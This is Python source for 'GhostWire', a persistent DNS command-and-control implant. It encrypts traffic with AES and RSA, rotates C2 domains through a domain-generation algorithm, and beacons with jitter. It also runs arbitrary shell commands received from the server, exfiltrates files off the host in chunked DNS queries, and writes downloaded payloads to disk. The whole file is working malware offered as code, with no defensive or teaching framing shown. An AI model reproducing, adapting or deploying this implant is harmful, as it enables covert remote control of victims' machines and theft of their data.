#!/usr/bin/env python3
"""
GhostWire Implant
=================
Persistent DNS C2 implant with encrypted communication.

Flow:
1. Generate AES-256 session key
2. RSA-encrypt key, send in chunks during registration
3. Enter main loop:
   - Beacon
   - Check for commands
   - Execute commands, send encrypted results
   - Upload/download files
   - Sleep with jitter
4. Clean exit on shutdown
"""

import sys
import os
import time
import random
import secrets
import subprocess
import signal
import base64

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from shared.protocol import (
    MSG_REGISTER, MSG_BEACON, MSG_CMDREQ, MSG_DATA, MSG_EXIT,
    MSG_UPLOAD, MSG_DOWNLOAD,
    EMPTY_DATA, KEY_END_MARKER, DATA_END_MARKER,
    build_query
)
from shared.config import (
    C2_DOMAINS, BEACON_SLEEP, BEACON_JITTER,
    DNS_LISTEN_PORT, ENCRYPTION_ENABLED, RSA_PUB_FILE,
    DGA_SEED, DGA_LENGTH
)
from shared.dga import DGA
from shared.crypto import AESCipher, RSAKeyManager, generate_session_key
from shared.logger import setup_logger, log_info, log_error
import dns.resolver


def debug_print(msg, **kwargs):
    """Print debug info only when DEBUG is enabled."""
    from shared.config import DEBUG
    if DEBUG:
        print(msg, **kwargs)


# ── Constants ──────────────────────────────────────────
CHUNK_SIZE = 60
MAX_RETRIES = 3
RECONNECT_DELAY = 30
DNS_TIMEOUT = 10

# ── Global State ───────────────────────────────────────
running = True


def signal_handler(sig, frame):
    global running
    print("\n[!] Shutdown signal received. Cleaning up...")
    running = False


signal.signal(signal.SIGINT, signal_handler)


# ── DNS Query ──────────────────────────────────────────
def send_dns_query(query_name, dns_server="127.0.0.1", dns_port=None):
    if dns_port is None:
        dns_port = DNS_LISTEN_PORT
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        resolver.port = dns_port
        resolver.timeout = DNS_TIMEOUT
        resolver.lifetime = DNS_TIMEOUT
        answers = resolver.resolve(query_name, 'TXT')
        for rdata in answers:
            text = b''.join(rdata.strings).decode()
            return text
    except dns.resolver.NXDOMAIN:
        return "ERROR:NXDOMAIN"
    except dns.resolver.Timeout:
        return "ERROR:TIMEOUT"
    except dns.resolver.NoAnswer:
        return "ERROR:NOANSWER"
    except Exception as e:
        return f"ERROR:{e}"


# ── Chunked Sending ────────────────────────────────────
def send_chunked_key(session_id, encrypted_key, dga_label, domain):
    key_chunks = [encrypted_key[i:i+CHUNK_SIZE] for i in range(0, len(encrypted_key), CHUNK_SIZE)]
    for i, chunk in enumerate(key_chunks):
        query = build_query(session_id, MSG_REGISTER, encoded_data=chunk,
                           chunk_num=i, dga_label=dga_label, domain=domain)
        response = send_dns_query(query)
        if response != "ACK":
            return False
    query = build_query(session_id, MSG_REGISTER, encoded_data=KEY_END_MARKER,
                       chunk_num=len(key_chunks), dga_label=dga_label, domain=domain)
    response = send_dns_query(query)
    return response == "ACK"


def send_chunked_data(session_id, encrypted_data, dga_label, domain):
    data_chunks = [encrypted_data[i:i+CHUNK_SIZE] for i in range(0, len(encrypted_data), CHUNK_SIZE)]
    for i, chunk in enumerate(data_chunks):
        query = build_query(session_id, MSG_DATA, encoded_data=chunk,
                           chunk_num=i, dga_label=dga_label, domain=domain)
        response = send_dns_query(query)
        if response != "ACK":
            return False
    query = build_query(session_id, MSG_DATA, encoded_data=DATA_END_MARKER,
                       chunk_num=len(data_chunks), dga_label=dga_label, domain=domain)
    response = send_dns_query(query)
    return response == "ACK"


def send_chunked_upload(session_id, encrypted_data, dga_label, domain):
    """Send encrypted file data in chunks using MSG_UPLOAD."""
    data_chunks = [encrypted_data[i:i+CHUNK_SIZE] for i in range(0, len(encrypted_data), CHUNK_SIZE)]
    for i, chunk in enumerate(data_chunks):
        query = build_query(session_id, MSG_UPLOAD, encoded_data=chunk,
                           chunk_num=i, dga_label=dga_label, domain=domain)
        response = send_dns_query(query)
        if response != "ACK":
            return False
    query = build_query(session_id, MSG_UPLOAD, encoded_data=DATA_END_MARKER,
                       chunk_num=len(data_chunks), dga_label=dga_label, domain=domain)
    response = send_dns_query(query)
    return response == "ACK"


# ── Command Execution ──────────────────────────────────
def execute_command(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += f"[STDERR] {result.stderr}"
        if not output:
            output = f"[EXIT:{result.returncode}]"
        return output.strip()[:4000]
    except subprocess.TimeoutExpired:
        return "ERROR: Command timed out (30s)"
    except Exception as e:
        return f"ERROR: {e}"


# ── Implant Class ──────────────────────────────────────
class GhostWireImplant:
    """Persistent DNS C2 implant."""

    def __init__(self):
        self.session_id = secrets.token_hex(4)
        self.aes_key = None
        self.aes = None
        self.dga = DGA(seed=DGA_SEED, length=DGA_LENGTH,
                       domain=C2_DOMAINS[0], backup_domains=C2_DOMAINS[1:])
        self.active_domain = None
        self.active_domain_index = 0
        self.registered = False

    def _get_dga_label(self):
        return self.dga.generate_label(domain_index=self.active_domain_index)

    def _send(self, msg_type, encoded_data="", chunk_num=0):
        query = build_query(
            self.session_id, msg_type,
            encoded_data=encoded_data,
            chunk_num=chunk_num,
            dga_label=self._get_dga_label(),
            domain=self.active_domain
        )
        return send_dns_query(query)

    def register(self):
        self.aes_key = generate_session_key()
        self.aes = AESCipher(self.aes_key)
        rsa_public = RSAKeyManager.load_public_key(RSA_PUB_FILE)
        encrypted_key = RSAKeyManager.encrypt_key(self.aes_key, rsa_public)
        success = send_chunked_key(
            self.session_id, encrypted_key,
            self._get_dga_label(), self.active_domain
        )
        if success:
            self.registered = True
            log_info(f"Implant registered, session {self.session_id}")
            return True
        return False

    def beacon(self):
        response = self._send(MSG_BEACON)
        if response == "ACK" or response == "CMD":
            return True
        return False

    def get_command(self):
        response = self._send(MSG_CMDREQ)
        if response == "NOOP" or response == "ACK":
            return None
        if response.startswith("ERROR:"):
            return None
        try:
            decrypted = self.aes.decrypt(response)
            if decrypted.startswith("CMD:"):
                return decrypted[4:]
            return None
        except Exception:
            return None

    def send_result(self, output):
        encrypted = self.aes.encrypt(output)
        return send_chunked_data(
            self.session_id, encrypted,
            self._get_dga_label(), self.active_domain
        )

    def exit_session(self):
        self._send(MSG_EXIT)

    def upload_file(self, filepath):
        """Read a file from disk, encrypt it, and send it to the server."""
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()
        except Exception as e:
            print(f"    ❌ Cannot read {filepath}: {e}")
            return False

        file_b64 = base64.b64encode(file_data).decode()
        encrypted = self.aes.encrypt(file_b64)

        debug_print(f"    📤 Uploading {filepath} ({len(file_data)} bytes → {len(encrypted)} chars encrypted)")

        success = send_chunked_upload(
            self.session_id, encrypted,
            self._get_dga_label(), self.active_domain
        )

        if success:
            debug_print(f"    ✅ Upload complete: {filepath}")
            log_info(f"Upload complete: {filepath}")
        else:
            print(f"    ❌ Upload failed: {filepath}")

        return success

    def download_file(self, remote_path):
        """Request a file from the server and write it to disk."""
        print(f"    📥 Downloading to {remote_path}...")

        chunks = []
        chunk_idx = 0

        while running:
            query = build_query(
                self.session_id, MSG_DOWNLOAD,
                chunk_num=chunk_idx,
                dga_label=self._get_dga_label(),
                domain=self.active_domain
            )
            response = send_dns_query(query)

            if response == "DONE" or response == "NOOP":
                break

            if response.startswith("ERROR:"):
                print(f"    ❌ Download error at chunk {chunk_idx}: {response}")
                return False

            chunks.append(response)
            chunk_idx += 1

        if not chunks:
            print(f"    ❌ No data received for download")
            return False

        encrypted = "".join(chunks)
        try:
            decrypted_b64 = self.aes.decrypt(encrypted)
            file_data = base64.b64decode(decrypted_b64)
        except Exception as e:
            print(f"    ❌ Failed to decrypt/decode download: {e}")
            return False

        try:
            dir_path = os.path.dirname(remote_path)
            if dir_path:
                os.makedirs(dir_path, exist_ok=True)
            with open(remote_path, 'wb') as f:
                f.write(file_data)
            debug_print(f"    ✅ Download complete: {remote_path} ({len(file_data)} bytes)")
            log_info(f"Download complete: {remote_path} ({len(file_data)} bytes)")
            return True
        except Exception as e:
            print(f"    ❌ Cannot write {remote_path}: {e}")
            return False

    def connect(self):
        for i, domain in enumerate(C2_DOMAINS):
            self.active_domain = domain
            self.active_domain_index = i
            tag = "PRIMARY" if i == 0 else f"BACKUP {i}"
            print(f"  [{tag}] Trying {domain}...")
            if self.register():
                print(f"  [{tag}] ✅ Connected to {domain}")
                return True
            else:
                print(f"  [{tag}] ❌ No response from {domain}")
        print("  ❌ Could not connect to any domain!")
        return False

    def reconnect(self):
        print("\n[!] Connection lost. Attempting to reconnect...")
        self.registered = False
        self.session_id = secrets.token_hex(4)
        for i, domain in enumerate(C2_DOMAINS):
            self.active_domain = domain
            self.active_domain_index = i
            tag = "PRIMARY" if i == 0 else f"BACKUP {i}"
            print(f"  [{tag}] Reconnecting to {domain}...")
            if self.register():
                print(f"  [{tag}] ✅ Reconnected to {domain}")
                return True
            time.sleep(5)
        return False


# ── Main Loop ──────────────────────────────────────────
def main():
    setup_logger()
    log_info("GhostWire Implant starting")

    implant = GhostWireImplant()

    print("=" * 60)
    print("  GhostWire Implant")
    print("=" * 60)
    print(f"  Session ID:    {implant.session_id}")
    print(f"  Encryption:    {'ENABLED (AES-256 + RSA-2048)' if ENCRYPTION_ENABLED else 'DISABLED'}")
    print(f"  Beacon:        {BEACON_SLEEP}s ± {BEACON_JITTER}s")
    print(f"  Domains:       {', '.join(C2_DOMAINS)}")
    print("=" * 60)

    # ── Phase 1: Register ──
    print("\n[1] Registering with C2 server...")
    if not implant.connect():
        print("  ❌ Registration failed. Exiting.")
        sys.exit(1)

    print(f"  Session: {implant.session_id}")
    print(f"  AES key: {implant.aes_key.hex()[:16]}...")

    # ── Phase 2: Main loop ──
    consecutive_failures = 0

    while running:
        try:
            if not implant.beacon():
                consecutive_failures += 1
                if consecutive_failures >= MAX_RETRIES:
                    if not implant.reconnect():
                        print("  ❌ Reconnection failed. Waiting before retry...")
                        time.sleep(RECONNECT_DELAY)
                        continue
                else:
                    print(f"  [!] Beacon failed ({consecutive_failures}/{MAX_RETRIES})")
                    time.sleep(BEACON_SLEEP)
                    continue
            else:
                consecutive_failures = 0
                log_info("Beacon acknowledged by server")

            command = implant.get_command()

            if command:
                # ── File upload ──
                if command.startswith("UPLOAD:"):
                    filepath = command[7:]
                    print(f"\n  📋 Upload request: {filepath}")
                    log_info(f"Upload requested: {filepath}")
                    implant.upload_file(filepath)

                # ── File download ──
                elif command.startswith("DOWNLOAD:"):
                    remote_path = command[9:]
                    print(f"\n  📋 Download request: {remote_path}")
                    log_info(f"Download requested: {remote_path}")
                    implant.download_file(remote_path)

                # ── Shell command ──
                else:
                    print(f"\n  📋 Command: {command}")
                    log_info(f"Executing command: {command}")
                    output = execute_command(command)
                    debug_print(f"  📤 Output ({len(output)} chars): {output[:60]}{'...' if len(output) > 60 else ''}")
                    implant.send_result(output)
            else:
                debug_print(".", end="", flush=True)

            sleep_time = BEACON_SLEEP + random.randint(-BEACON_JITTER, BEACON_JITTER)
            time.sleep(max(sleep_time, 1))

        except Exception as e:
            print(f"\n  [!] Error: {e}")
            log_error(f"Main loop error: {e}")
            time.sleep(BEACON_SLEEP)

    # ── Phase 3: Clean exit ──
    print("\n[3] Sending EXIT...")
    implant.exit_session()
    print("  Session closed.")


if __name__ == "__main__":
    main()
